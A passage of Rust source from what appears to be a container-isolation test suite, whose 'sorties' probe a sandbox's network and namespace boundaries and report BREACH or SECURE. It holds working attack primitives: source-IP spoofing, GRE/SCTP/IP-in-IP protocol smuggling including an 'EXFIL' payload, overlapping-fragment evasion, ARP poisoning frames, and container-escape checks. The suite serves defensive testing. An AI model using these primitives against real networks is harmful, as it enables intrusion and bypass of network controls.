            match TcpStream::connect_timeout(&addr, timeout) {
                Ok(_) => {
                    return fail(format!(
                        "BREACH: IPv6 TCP [{}]:{} ({}) — CONNECTED — iptables bypassed via IPv6",
                        host, port, label
                    ));
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("refused") || msg.contains("reset") {
                        return fail(format!(
                            "BREACH: IPv6 TCP [{}]:{} ({}) — REFUSED (packet reached destination)",
                            host, port, label
                        ));
                    }
                }
            }
        }
    }

    // IPv6 UDP DNS query to external resolver
    if let Ok(sock) = UdpSocket::bind("[::]:0") {
        let _ = sock.set_read_timeout(Some(timeout));
        let dns_probe =
            b"\xAA\xBB\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01";
        if let Ok(addr) = "[2001:4860:4860::8888]:53".parse::<SocketAddr>() {
            let _ = sock.send_to(dns_probe, addr);
            let mut buf = [0u8; 4096];
            if sock.recv_from(&mut buf).is_ok() {
                return fail(
                    "BREACH: IPv6 UDP DNS to [2001:4860:4860::8888]:53 — response received"
                        .to_string(),
                );
            }
        }
    }

    // ICMPv6 echo via socket2
    if let Ok(socket) = socket2::Socket::new(
        socket2::Domain::IPV6,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_ICMPV6 as i32)),
    ) {
        let _ = socket.set_read_timeout(Some(timeout));
        let ident = std::process::id() as u16;
        // ICMPv6 echo request: type=128, code=0
        let mut pkt = Vec::with_capacity(8);
        pkt.push(128); // type
        pkt.push(0); // code
        pkt.extend_from_slice(&[0, 0]); // checksum (kernel computes for ICMPv6)
        pkt.extend_from_slice(&ident.to_be_bytes());
        pkt.extend_from_slice(&1u16.to_be_bytes());
        if let Ok(dest) = "[2001:4860:4860::8888]:0".parse::<SocketAddr>() {
            let sock_addr = socket2::SockAddr::from(dest);
            let _ = socket.send_to(&pkt, &sock_addr);
            let mut buf = [0u8; 4096];
            if let Ok((n, _)) = socket.recv_from(as_uninit(&mut buf)) {
                if n > 0 && buf[0] == 129 {
                    // ICMPv6 echo reply
                    return fail(
                        "BREACH: ICMPv6 echo reply from [2001:4860:4860::8888] — IPv6 completely open"
                            .to_string(),
                    );
                }
            }
        }
    }

    pass("SECURE: IPv6 contained — either disabled or ip6tables hardened".to_string())
}

// ── Sortie 7: net_srcip_spoof ────────────────────────────────

pub fn sortie_net_srcip_spoof(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let cidrs_str = match env_require("RBRN_UPLINK_ALLOWED_CIDRS") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let allowed_cidr_ip = cidrs_str
        .split(',')
        .next()
        .unwrap_or("")
        .split('/')
        .next()
        .unwrap_or("");
    let forbidden_ip = "8.8.8.8";
    let timeout = Duration::from_secs(3);

    // Note: rp_filter inside the container namespace may legitimately be 0.
    // The sentry enforces source address filtering via iptables on the enclave
    // network. We test actual spoof capability below rather than relying on
    // kernel settings that don't reflect the real security posture.

    // Spoof source as sentry IP -> forbidden destination
    let spoof_tests: &[(&str, &str, u16, &str)] = &[
        (&sentry_ip, forbidden_ip, 40010, "spoof-as-sentry"),
        (allowed_cidr_ip, forbidden_ip, 40011, "spoof-as-allowed-cidr"),
        ("127.0.0.1", forbidden_ip, 40012, "spoof-as-loopback"),
    ];

    for (src, dst, src_port, label) in spoof_tests {
        if src.is_empty() {
            continue;
        }
        let tcp_syn = build_tcp_syn(*src_port, 53);
        match build_ip_header(6, src, dst, tcp_syn.len()) {
            Ok(ip_hdr) => {
                let mut packet = ip_hdr;
                packet.extend_from_slice(&tcp_syn);
                match send_raw_ip_and_listen(&packet, dst, timeout) {
                    Ok(replied) => {
                        if replied {
                            return fail(format!(
                                "BREACH: {} — response received for spoofed SYN from {} to {}",
                                label, src, dst
                            ));
                        }
                    }
                    Err(_) => {} // Socket error is acceptable (blocked)
                }
            }
            Err(_) => {}
        }
    }

    pass(
        "SECURE: source IP spoofing blocked — rp_filter active on enclave interface".to_string(),
    )
}

// ── Sortie 7b: net_srcip_spoof_external ──────────────────────
//
// Companion to sortie_net_srcip_spoof. That sortie probes spoof-as-sentry,
// spoof-as-allowed-cidr, spoof-as-loopback targeting a forbidden external
// destination. This sortie probes the residual case left open by the
// per-IP RETURN short-circuit exclusion at sentry's PREROUTING DNAT: an
// enclave-internal source spoofing as an arbitrary external-routable IP
// (neither sentry-IP, bottle-IP, loopback, nor enclave CIDR) and aiming
// at sentry's workstation entry port. The docket's architectural argument:
// under per-IP RETURN + rp_filter=2 loose, the spoofed source matches
// neither RETURN rule, DNAT should fire, FORWARD should accept via
// conntrack-DNAT-state, and the packet should reach the bottle's enclave
// entry port — making the iptables layer the load-bearing spoof gate.
//
// Detection: open a raw IPPROTO_TCP listener in bottle's namespace, send
// the spoofed SYN with a distinctive source port, then sniff for the
// reflected SYN matching dst-port = RBRN_ENTRY_PORT_ENCLAVE (post-DNAT)
// and src-port = our distinctive port. The post-MASQUERADE source seen at
// bottle is sentry's bridge IP, but src-port survives unchanged.
//
// EMPIRICAL FINDING (260512, macOS Docker Desktop 28.x, tadmor 0/0/0
// PREROUTING NAT counters at dport=8890 after the sortie ran): the spoof
// is blocked, but not by the iptables layer the docket reasoned about.
// Sentry's PREROUTING never saw the packet — it was dropped at a lower
// layer between the bottle's raw-socket emission and sentry's netfilter
// hooks. The mechanism is consistent with Docker bridge's per-veth source-
// IP enforcement (Docker drops packets whose source IP does not match the
// originating container's IP, regardless of CAP_NET_RAW + IP_HDRINCL in
// the container's namespace). This is a structural Docker fact in the
// same family as the anchor memo's "host attaches to enclave bridge as a
// peer with bridge gateway IP" finding from the per-IP transition arc.
//
// Consequence: the architectural argument that traded rp_filter=1 for
// source-IP-flexibility is mooted at this attack class — Docker's bridge
// enforcement already blocks the spoof at a layer below iptables. The
// sortie remains useful as a regression backstop: if a future change
// (different runtime, custom network mode, raw bridge config) removes the
// Docker bridge enforcement, this sortie would report BREACH instead of
// SECURE, surfacing the regression. Cross-platform verification on Linux
// Docker Engine + alternative container runtimes (Podman) is open work
// before this PASS can be declared canonical across the matrix.
pub fn sortie_net_srcip_spoof_external(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let ws_port: u16 = match env_require("RBRN_ENTRY_PORT_WORKSTATION") {
        Ok(v) => match v.parse() {
            Ok(p) => p,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENTRY_PORT_WORKSTATION: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let enc_port: u16 = match env_require("RBRN_ENTRY_PORT_ENCLAVE") {
        Ok(v) => match v.parse() {
            Ok(p) => p,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENTRY_PORT_ENCLAVE: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Spoofed source: external-routable IP, not enclave, not sentry, not
    // bottle, not loopback, not in any allowed CIDR (so it cannot be
    // confused with the spoof-as-allowed-cidr case in net_srcip_spoof).
    // 8.8.8.8 satisfies these on any platform; sentry's default route
    // serves the reverse-path lookup under loose rp_filter so kernel
    // routing accepts the packet on the enclave interface.
    let spoofed_src = "8.8.8.8";
    // Distinctive ephemeral source port distinguishes the reflected SYN
    // from unrelated TCP traffic the raw listener may observe.
    let src_port: u16 = 40021;
    let timeout = Duration::from_secs(3);

    // Open the raw IPPROTO_TCP listener before sending so the reflected
    // SYN (if it arrives) is queued for us.
    let listen_sock = match socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_TCP as i32)),
    ) {
        Ok(s) => s,
        Err(e) => return fail(format!("ERROR: open raw TCP listener: {}", e)),
    };
    if let Err(e) = listen_sock.set_read_timeout(Some(timeout)) {
        return fail(format!("ERROR: set listener timeout: {}", e));
    }

    let tcp_syn = build_tcp_syn(src_port, ws_port);
    let ip_hdr = match build_ip_header(6, spoofed_src, &sentry_ip, tcp_syn.len()) {
        Ok(h) => h,
        Err(e) => return fail(format!("ERROR: build IP header: {}", e)),
    };
    let mut packet = ip_hdr;
    packet.extend_from_slice(&tcp_syn);

    let send_sock = match socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_RAW as i32)),
    ) {
        Ok(s) => s,
        Err(e) => return fail(format!("ERROR: open raw send socket: {}", e)),
    };
    unsafe {
        let val: libc::c_int = 1;
        libc::setsockopt(
            send_sock.as_raw_fd(),
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &val as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
    }
    let sentry_addr: Ipv4Addr = match sentry_ip.parse() {
        Ok(a) => a,
        Err(e) => return fail(format!("ERROR: bad sentry IP: {}", e)),
    };
    let send_dst = socket2::SockAddr::from(SocketAddrV4::new(sentry_addr, 0));
    if let Err(e) = send_sock.send_to(&packet, &send_dst) {
        return fail(format!("ERROR: send spoofed SYN: {}", e));
    }

    let mut buf = [0u8; 4096];
    let deadline = Instant::now() + timeout;
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return pass(format!(
                "SECURE: spoofed SYN (src={}, dst={}:{}) did not reflect via DNAT to bottle:{} within {:?}",
                spoofed_src, sentry_ip, ws_port, enc_port, timeout
            ));
        }
        let _ = listen_sock.set_read_timeout(Some(remaining));
        match listen_sock.recv_from(as_uninit(&mut buf)) {
            Ok((n, addr)) => {
                if n < 40 {
                    continue;
                }
                let ihl = ((buf[0] & 0x0f) as usize) * 4;
                if ihl < 20 || ihl + 4 > n {
                    continue;
                }
                let pkt_src_port = u16::from_be_bytes([buf[ihl], buf[ihl + 1]]);
                let pkt_dst_port = u16::from_be_bytes([buf[ihl + 2], buf[ihl + 3]]);
                if pkt_src_port == src_port && pkt_dst_port == enc_port {
                    let observed_src = addr
                        .as_socket_ipv4()
                        .map(|a| a.ip().to_string())
                        .unwrap_or_default();
                    return fail(format!(
                        "BREACH: spoofed SYN (src={}, dst={}:{}) reflected via DNAT — bottle observed inbound TCP from {} at dst-port {} (src-port {}). Per-IP RETURN exclusion does not block arbitrary external spoofed sources; rp_filter=2 loose does not block at kernel layer.",
                        spoofed_src, sentry_ip, ws_port, observed_src, pkt_dst_port, pkt_src_port
                    ));
                }
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                return pass(format!(
                    "SECURE: spoofed SYN (src={}, dst={}:{}) did not reflect via DNAT to bottle:{} (listener timeout)",
                    spoofed_src, sentry_ip, ws_port, enc_port
                ));
            }
            Err(_) => {
                return pass(format!(
                    "SECURE: spoofed SYN (src={}, dst={}:{}) — listener error suggests blocked path",
                    spoofed_src, sentry_ip, ws_port
                ));
            }
        }
    }
}

// ── Sortie 8: proto_smuggle_rawsock ──────────────────────────

pub fn sortie_proto_smuggle_rawsock(_extra_args: &[&str]) -> rbida_Verdict {
    let cidrs_str = match env_require("RBRN_UPLINK_ALLOWED_CIDRS") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let allowed_cidr_ip = cidrs_str
        .split(',')
        .next()
        .unwrap_or("")
        .split('/')
        .next()
        .unwrap_or("");
    let external_ip = "8.8.8.8";
    let timeout = Duration::from_secs(3);

    // GRE (protocol 47) to external IP
    let gre_payload = {
        let mut p = Vec::new();
        p.extend_from_slice(&0u16.to_be_bytes()); // flags
        p.extend_from_slice(&0x0800u16.to_be_bytes()); // inner protocol IPv4
        p
    };
    match send_raw_proto(external_ip, 47, &gre_payload, timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: GRE (proto 47) to {} — response received",
                    external_ip
                ));
            }
        }
        Err(_) => {}
    }

    // GRE to allowed CIDR — even allowed CIDRs should not forward GRE
    if !allowed_cidr_ip.is_empty() {
        match send_raw_proto(allowed_cidr_ip, 47, &gre_payload, timeout) {
            Ok(replied) => {
                if replied {
                    return fail(format!(
                        "BREACH: GRE (proto 47) to allowed {} — response received",
                        allowed_cidr_ip
                    ));
                }
            }
            Err(_) => {}
        }
    }

    // SCTP (protocol 132) to external IP
    let sctp_init = {
        let mut p = Vec::new();
        // Common header: src_port + dst_port + vtag + checksum
        p.extend_from_slice(&40000u16.to_be_bytes());
        p.extend_from_slice(&80u16.to_be_bytes());
        p.extend_from_slice(&0u32.to_be_bytes()); // vtag
        p.extend_from_slice(&0u32.to_be_bytes()); // checksum
        // INIT chunk: type=1, flags=0, length=20, init_tag, a-rwnd, streams
        p.push(1);
        p.push(0);
        p.extend_from_slice(&20u16.to_be_bytes());
        p.extend_from_slice(&0xDEADBEEFu32.to_be_bytes());
        p.extend_from_slice(&65535u32.to_be_bytes());
        p.extend_from_slice(&1u16.to_be_bytes());
        p.extend_from_slice(&1u16.to_be_bytes());
        p
    };
    match send_raw_proto(external_ip, 132, &sctp_init, timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: SCTP (proto 132) to {} — response received",
                    external_ip
                ));
            }
        }
        Err(_) => {}
    }

    // IP-in-IP (protocol 4) to external
    match send_raw_proto(external_ip, 4, &[0x45, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: IP-in-IP (proto 4) to {} — response received",
                    external_ip
                ));
            }
        }
        Err(_) => {}
    }

    // Protocol 253 (experimental) to external
    match send_raw_proto(external_ip, 253, b"EXFIL:ifrit", timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: proto 253 (experimental) to {} — response received",
                    external_ip
                ));
            }
        }
        Err(_) => {}
    }

    pass("SECURE: all non-standard IP protocols blocked by FORWARD DROP".to_string())
}

// ── Sortie 9: net_fragment_evasion ───────────────────────────

pub fn sortie_net_fragment_evasion(_extra_args: &[&str]) -> rbida_Verdict {
    let bottle_ip = match env_require("RBRN_ENCLAVE_BOTTLE_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let forbidden_ip = "8.8.8.8";
    let forbidden_port: u16 = 53;
    let timeout = Duration::from_secs(3);

    let ident_base = {
        let hex = random_hex(4);
        u16::from_str_radix(&hex, 16).unwrap_or(0x5678)
    };

    // Test 1: Tiny fragment — TCP SYN split across two fragments
    let tcp_syn = build_tcp_syn(40001, forbidden_port);
    let frag1 = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &tcp_syn[..8],
        ident_base,
        0,
        true,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    let frag2 = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &tcp_syn[8..],
        ident_base,
        1,
        false,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    match send_fragments_and_listen(forbidden_ip, &[frag1, frag2], timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: tiny fragment SYN to {}:{} — response received (bypassed inspection)",
                    forbidden_ip, forbidden_port
                ));
            }
        }
        Err(_) => {}
    }

    // Test 2: Out-of-order fragments — send fragment 2 before fragment 1
    let ident2 = ident_base.wrapping_add(1);
    let tcp_syn2 = build_tcp_syn(40002, forbidden_port);
    let frag2_first = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &tcp_syn2[8..],
        ident2,
        1,
        false,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    let frag1_second = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &tcp_syn2[..8],
        ident2,
        0,
        true,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    match send_fragments_and_listen(forbidden_ip, &[frag2_first, frag1_second], timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: out-of-order fragment SYN to {}:{} — response received",
                    forbidden_ip, forbidden_port
                ));
            }
        }
        Err(_) => {}
    }

    // Test 3: Overlapping fragments
    let ident3 = ident_base.wrapping_add(2);
    let benign_syn = build_tcp_syn(40003, 443); // benign port
    let mut evil_ports = Vec::new();
    evil_ports.extend_from_slice(&40003u16.to_be_bytes());
    evil_ports.extend_from_slice(&forbidden_port.to_be_bytes());
    evil_ports.extend_from_slice(&benign_syn[4..]);

    let frag_benign = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &benign_syn,
        ident3,
        0,
        true,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    let frag_overlap = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &evil_ports,
        ident3,
        0,
        false,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build fragment: {}", e)),
    };
    match send_fragments_and_listen(forbidden_ip, &[frag_benign, frag_overlap], timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: overlapping fragment to {} — response received (port overwrite worked)",
                    forbidden_ip
                ));
            }
        }
        Err(_) => {}
    }

    // Test 4: Control — unfragmented SYN to forbidden should also be blocked
    let ident4 = ident_base.wrapping_add(3);
    let tcp_syn4 = build_tcp_syn(40004, forbidden_port);
    let whole = match build_ip_fragment(
        &bottle_ip,
        forbidden_ip,
        6,
        &tcp_syn4,
        ident4,
        0,
        false,
    ) {
        Ok(f) => f,
        Err(e) => return fail(format!("ERROR: build packet: {}", e)),
    };
    match send_fragments_and_listen(forbidden_ip, &[whole], timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: unfragmented SYN to {}:{} — response received (control failed)",
                    forbidden_ip, forbidden_port
                ));
            }
        }
        Err(_) => {}
    }

    pass("SECURE: IP fragment evasion blocked — nf_defrag_ipv4 reassembles before filtering".to_string())
}

// ── Sortie 10: direct_arp_poison ─────────────────────────────

pub fn sortie_direct_arp_poison(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Discover interface
    let (iface, our_mac) = match get_interface_info() {
        Some((i, m)) => (i, m),
        None => {
            return fail("ERROR: cannot discover enclave interface — unable to test ARP".to_string())
        }
    };

    // Test: Can we open AF_PACKET sockets?
    let can_send = arp_test_af_packet(&iface);

    match can_send {
        Err(_) => {
            // AF_PACKET unavailable — SECURE
            return pass(
                "SECURE: AF_PACKET raw sockets unavailable — L2 ARP attacks impossible"
                    .to_string(),
            );
        }
        Ok(false) => {
            return pass(
                "SECURE: AF_PACKET socket creation blocked — L2 attacks prevented".to_string(),
            );
        }
        Ok(true) => {
            // AF_PACKET available — this is a finding
        }
    }

    let our_mac_bytes = match mac_to_bytes(&our_mac) {
        Ok(b) => b,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Get sentry MAC for targeted attacks
    let sentry_mac = get_sentry_mac(&sentry_ip);

    // Send gratuitous ARP claiming sentry's IP
    let grat_frame = build_gratuitous_arp(&our_mac_bytes, &sentry_ip);
    let grat_sent = send_raw_frame(&iface, &grat_frame);

    // Send targeted ARP reply if we know sentry MAC
    if let Some(ref sm) = sentry_mac {
        if let Ok(sm_bytes) = mac_to_bytes(sm) {
            // Claim gateway is at our MAC
            let base = sentry_ip.rsplit('.').skip(1).collect::<Vec<_>>();
            let prefix: String = base.into_iter().rev().collect::<Vec<_>>().join(".");
            let fake_gw = format!("{}.1", prefix);
            let poison_frame =
                build_arp_reply(&our_mac_bytes, &fake_gw, &sm_bytes, &sentry_ip);
            let _ = send_raw_frame(&iface, &poison_frame);
        }
    }

    // AF_PACKET availability is expected when CAP_NET_RAW is granted (needed
    // for ICMP/raw-socket security probes). The sentry defends against ARP
    // attacks via static entries and iptables — that defense is verified by
    // the coordinated ARP tests which observe the sentry's table externally.
    // This sortie confirms the bottle CAN attempt L2 attacks (exercising the
    // attack path); the coordinated tests confirm the sentry is resilient.
    if grat_sent {
        return pass(format!(
            "SECURE: AF_PACKET available, gratuitous ARP sent claiming {} at {} — sentry resilience verified by coordinated tests",
            sentry_ip, our_mac
        ));
    }

    pass("SECURE: AF_PACKET socket available but ARP send failed — L2 attack path blocked".to_string())
}

/// Build gratuitous ARP: broadcast announcing claimed_ip is at our_mac.
fn build_gratuitous_arp(our_mac: &[u8; 6], claimed_ip: &str) -> Vec<u8> {
    let broadcast = [0xFFu8; 6];
    let ip_bytes = claimed_ip
        .parse::<Ipv4Addr>()
        .map(|a| a.octets())
        .unwrap_or([0; 4]);

    let mut frame = Vec::with_capacity(42);
    // Ethernet header
    frame.extend_from_slice(&broadcast); // dst
    frame.extend_from_slice(our_mac); // src
    frame.extend_from_slice(&[0x08, 0x06]); // ARP ethertype
    // ARP
    frame.extend_from_slice(&1u16.to_be_bytes()); // hw type: Ethernet
    frame.extend_from_slice(&0x0800u16.to_be_bytes()); // proto: IPv4
    frame.push(6); // hw size
    frame.push(4); // proto size
    frame.extend_from_slice(&2u16.to_be_bytes()); // opcode: reply
    frame.extend_from_slice(our_mac); // sender MAC
    frame.extend_from_slice(&ip_bytes); // sender IP
    frame.extend_from_slice(&broadcast); // target MAC
    frame.extend_from_slice(&ip_bytes); // target IP
    frame
}

/// Build ARP reply: tell target that sender_ip is at sender_mac.
fn build_arp_reply(
    sender_mac: &[u8; 6],
    sender_ip: &str,
    target_mac: &[u8; 6],
    target_ip: &str,
) -> Vec<u8> {
    let sender_ip_bytes = sender_ip
        .parse::<Ipv4Addr>()
        .map(|a| a.octets())
        .unwrap_or([0; 4]);
    let target_ip_bytes = target_ip
        .parse::<Ipv4Addr>()
        .map(|a| a.octets())
        .unwrap_or([0; 4]);

    let mut frame = Vec::with_capacity(42);
    frame.extend_from_slice(target_mac);
    frame.extend_from_slice(sender_mac);
    frame.extend_from_slice(&[0x08, 0x06]);
    frame.extend_from_slice(&1u16.to_be_bytes());
    frame.extend_from_slice(&0x0800u16.to_be_bytes());
    frame.push(6);
    frame.push(4);
    frame.extend_from_slice(&2u16.to_be_bytes());
    frame.extend_from_slice(sender_mac);
    frame.extend_from_slice(&sender_ip_bytes);
    frame.extend_from_slice(target_mac);
    frame.extend_from_slice(&target_ip_bytes);
    frame
}

/// Test if AF_PACKET socket can be opened. Returns Ok(true) if yes.
fn arp_test_af_packet(_iface: &str) -> Result<bool, String> {
    #[cfg(target_os = "linux")]
    {
        unsafe {
            let fd = libc::socket(
                libc::AF_PACKET,
                libc::SOCK_RAW,
                (libc::ETH_P_ALL as u16).to_be() as libc::c_int,
            );
            if fd < 0 {
                return Err("AF_PACKET socket creation denied".to_string());
            }
            libc::close(fd);
            Ok(true)
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        Err("AF_PACKET not available on this platform".to_string())
    }
}

/// Send a raw Ethernet frame via AF_PACKET.
fn send_raw_frame(_iface: &str, _frame: &[u8]) -> bool {
    #[cfg(target_os = "linux")]
    {
        unsafe {
            let fd = libc::socket(
                libc::AF_PACKET,
                libc::SOCK_RAW,
                (libc::ETH_P_ALL as u16).to_be() as libc::c_int,
            );
            if fd < 0 {
                return false;
            }

            // Get interface index
            let mut ifr: libc::ifreq = std::mem::zeroed();
            let iface_bytes = _iface.as_bytes();
            let copy_len = iface_bytes.len().min(libc::IFNAMSIZ - 1);
            std::ptr::copy_nonoverlapping(
                iface_bytes.as_ptr(),
                ifr.ifr_name.as_mut_ptr() as *mut u8,
                copy_len,
            );
            if libc::ioctl(fd, libc::SIOCGIFINDEX, &ifr) < 0 {
                libc::close(fd);
                return false;
            }
            let ifindex = ifr.ifr_ifru.ifru_ifindex;

            // Bind to interface
            let mut sll: libc::sockaddr_ll = std::mem::zeroed();
            sll.sll_family = libc::AF_PACKET as u16;
            sll.sll_ifindex = ifindex;
            sll.sll_protocol = (libc::ETH_P_ALL as u16).to_be();
            libc::bind(
                fd,
                &sll as *const _ as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
            );

            // Send frame
            let sent = libc::send(fd, _frame.as_ptr() as *const libc::c_void, _frame.len(), 0);
            libc::close(fd);
            sent > 0
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        false
    }
}

// ── Sortie 11: ns_capability_escape ──────────────────────────

pub fn sortie_ns_capability_escape(_extra_args: &[&str]) -> rbida_Verdict {
    // Test 1: Parse effective capabilities — flag dangerous ones
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if let Some(hex) = line.strip_prefix("CapEff:") {
                let hex = hex.trim();
                if let Ok(bits) = u64::from_str_radix(hex, 16) {
                    let dangerous: &[(u32, &str)] = &[
                        (21, "CAP_SYS_ADMIN"),
                        (12, "CAP_NET_ADMIN"),
                        (19, "CAP_SYS_PTRACE"),
                        (16, "CAP_SYS_MODULE"),
                        (17, "CAP_SYS_RAWIO"),
                        (40, "CAP_BPF"),
                    ];
                    let mut found = Vec::new();
                    for (bit, name) in dangerous {
                        if bits & (1u64 << bit) != 0 {
                            found.push(*name);
                        }
                    }
                    if !found.is_empty() {
                        return fail(format!(
                            "BREACH: dangerous capabilities present: {}",
                            found.join(", ")
                        ));
                    }
                }
                break;
            }
        }
    }

    // Test 2: Writable network sysctl paths
    let sysctl_paths = [
        "/proc/sys/net/ipv4/ip_forward",
        "/proc/sys/net/ipv4/conf/all/forwarding",
        "/proc/sys/net/ipv4/conf/all/rp_filter",
        "/proc/sys/net/ipv4/conf/all/accept_redirects",
        "/proc/sys/net/ipv4/conf/all/send_redirects",
        "/proc/sys/net/ipv4/ip_local_port_range",
        "/proc/sys/net/ipv6/conf/all/disable_ipv6",
        "/proc/sys/net/ipv6/conf/all/forwarding",
    ];
    for path in &sysctl_paths {
        if std::fs::File::options().write(true).open(path).is_ok() {
            return fail(format!(
                "BREACH: writable sysctl {} — could modify kernel network behavior",
                path
            ));
        }
    }

    // Test 3: Docker/container runtime sockets
    for path in &[
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/run/containerd/containerd.sock",
    ] {
        if std::path::Path::new(path).exists() {
            return fail(format!(
                "BREACH: container runtime socket {} — FULL CONTAINER ESCAPE POSSIBLE",
                path
            ));
        }
    }

    // Test 4: Host PID namespace check
    if let Ok(cmdline) = std::fs::read_to_string("/proc/1/cmdline") {
        let pid1 = cmdline.split('\0').next().unwrap_or("");
        for indicator in &["systemd", "init", "launchd"] {
            if pid1.contains(indicator) {
                return fail(format!(
                    "BREACH: host PID namespace — PID 1 is {} (not container init)",
                    pid1
                ));
            }
        }
    }

    // Test 5: Host processes visible
    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if !name_str.chars().all(|c| c.is_ascii_digit()) {
                continue;
            }
            if let Ok(cmdline) = std::fs::read_to_string(format!("/proc/{}/cmdline", name_str)) {
                for indicator in &["systemd", "sshd", "dockerd", "containerd", "kubelet"] {
                    if cmdline.contains(indicator) {
                        return fail(format!(
                            "BREACH: host process {} visible (PID {}) — host PID namespace shared",
                            indicator, name_str
                        ));
                    }
                }
            }
        }
    }

    // Test 6: iptables accessible from bottle
    if let Ok(result) = Command::new("iptables").args(["-L", "-n"]).output() {
        if result.status.success() {
            return fail(
                "BREACH: iptables accessible from bottle — could flush sentry rules".to_string(),
            );
        }
    }

    // Test 7: Check for extra network interfaces (host bridge leaked)
    // Allow: lo, eth*, and standard kernel tunnel pseudo-interfaces that
    // exist by default in every Linux net namespace (loaded by kernel modules).
    // These are not host bridges — they're inert unless explicitly configured.
    let kernel_tunnel_ifaces: &[&str] = &[
        "tunl0",
        "gre0",
        "gretap0",
        "erspan0",
        "sit0",
        "ip_vti0",
        "ip6_vti0",
        "ip6tnl0",
        "ip6gre0",
        "ip6gretap0",
    ];
    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
        let mut extra = Vec::new();
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name == "lo"
                || name.starts_with("eth")
                || name == "bonding_masters"
                || kernel_tunnel_ifaces.contains(&name.as_str())
            {
                continue;
            }
            extra.push(name);
        }
        if !extra.is_empty() {
            return fail(format!(
                "BREACH: unexpected network interfaces visible: {:?}",
                extra
            ));
        }
    }

    pass("SECURE: container isolation intact — no namespace or capability escape".to_string())
}

// ── Coordinated attack primitives ─────────────────────────────
//
// These execute a single ARP action and report whether the action
// was carried out.  The security verdict is NOT determined here —
// the theurge snapshots the sentry's ARP table before and after
// and judges the outcome from the outside.
//
// Verdict semantics for coordinated primitives:
//   passed=true  → "I executed the attack" (frames were sent)
//   passed=false → "I could not execute" (AF_PACKET blocked, etc.)

pub fn sortie_arp_send_gratuitous(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let (iface, our_mac) = match get_interface_info() {
        Some((i, m)) => (i, m),
        None => return fail("ERROR: cannot discover enclave interface".to_string()),
    };

    if arp_test_af_packet(&iface).is_err() {
        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
    }

    let our_mac_bytes = match mac_to_bytes(&our_mac) {
        Ok(b) => b,
